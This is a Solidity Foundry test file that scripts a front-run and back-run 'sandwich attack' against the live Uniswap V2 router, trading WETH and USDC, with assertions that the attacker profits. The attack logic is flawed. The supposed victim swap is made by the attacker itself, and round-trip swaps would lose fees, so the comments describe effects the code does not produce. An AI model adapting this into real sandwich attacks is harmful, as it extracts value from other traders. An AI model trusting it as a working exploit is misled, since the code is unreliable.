// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint) external;
    function balanceOf(address owner) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address attacker = address(this);
    IUniswapV2Router02 router;
    IERC20 token;
    IWETH weth;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        router = IUniswapV2Router02(TARGET);
        weth = IWETH(router.WETH());
        token = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // USDC

        deal(attacker, 100 ether);

        vm.label(TARGET, "UniswapV2Router");
        vm.label(attacker, "Attacker");
        vm.label(address(token), "USDC");
        vm.label(address(weth), "WETH");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = attacker.balance;

        // Sandwich attack path: WETH -> USDC -> WETH
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(token);

        // Step 1: Front-run - Buy USDC with ETH to push price up
        uint256 attackAmount = 50 ether;
        weth.deposit{value: attackAmount}();
        weth.approve(TARGET, attackAmount);

        // Front-run swap: ETH -> USDC (pushes USDC price up)
        router.swapExactTokensForTokens(attackAmount, 0, path, attacker, block.timestamp + 3600);

        // Step 2: Simulate victim transaction - They swap USDC back at worse rate
        // Victim expects certain ETH output but gets less due to our front-run
        path[0] = address(token);
        path[1] = address(weth);

        uint256 tokenBalance = token.balanceOf(attacker);
        token.approve(TARGET, tokenBalance);

        // Victim swap: USDC -> ETH (executes at unfavorable price)
        router.swapExactTokensForTokens(tokenBalance / 2, 0, path, attacker, block.timestamp + 3600);

        // Step 3: Back-run - Sell remaining USDC for ETH at profit
        uint256 remainingTokens = token.balanceOf(attacker);
        if (remainingTokens > 0) {
            token.approve(TARGET, remainingTokens);
            router.swapExactTokensForTokens(remainingTokens, 0, path, attacker, block.timestamp + 3600);
        }

        // Convert WETH back to ETH
        uint256 wethBalance = weth.balanceOf(attacker);
        if (wethBalance > 0) {
            weth.withdraw(wethBalance);
        }

        uint256 finalBalance = attacker.balance;

        // Oracle check: attacker balance must increase
        assertGt(finalBalance, initialBalance, "Attacker did not profit from sandwich attack");
        finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

